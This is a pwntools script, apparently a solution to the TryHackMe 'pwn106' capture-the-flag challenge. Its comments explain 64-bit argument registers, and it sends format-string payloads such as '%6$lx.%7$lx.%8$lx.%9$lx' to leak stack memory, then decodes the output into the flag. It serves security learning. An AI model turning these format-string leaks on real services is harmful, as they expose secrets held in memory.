from pwn import *

#remember; RDI, RSI, RDX, RCX, R8, R9 and then the stack is called
# RDI is always the argument passed as an address to the stack
#so printf("%x %x ...) starts at RSI or argv[1]
#but only 4 bytes (32 bits which is default integer size) of the 8 bytes at that memory location!!!
#so you have to use %lx to print the whole 8 bytes!!!
#this is important for 64 bit machines!  not with 32 bit.


context.binary = binary = "./pwn106"

#payload = "%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx."
#payload = "%p.%p.%%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
#payload = "%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s.%s."
# looking 54 48 4d = THM; i.e. a result like 5b5858587b4d4854
# which in this case is located at the 6th %lx position
# now looking at the decompiled binary, you can see that the flag is split into four memory positions
# so we need to leak $6lx to $9lx to get the flag

payload = "%6$lx.%7$lx.%8$lx.%9$lx"
#will have to go up yo %10lx on the remote machine; maybe if we started by nulling the environment variables it would've worked

p = process()
p.recv()
p.sendline(payload)

output = p.recvall()
print(output)

output = output.split(b" ")  #split the output into sections separated by " "
print(output)

output = output[1].split(b".")  # now select the second element and spilt it again by "."
print(output)

flag = ""
for word in output:
	flag +=bytes.fromhex(word.decode("utf-8"))[::-1].decode("utf-8")
	print(flag)
#this decodes each word in the output from hex and in reverse due to little endianess; and then adds it to flag












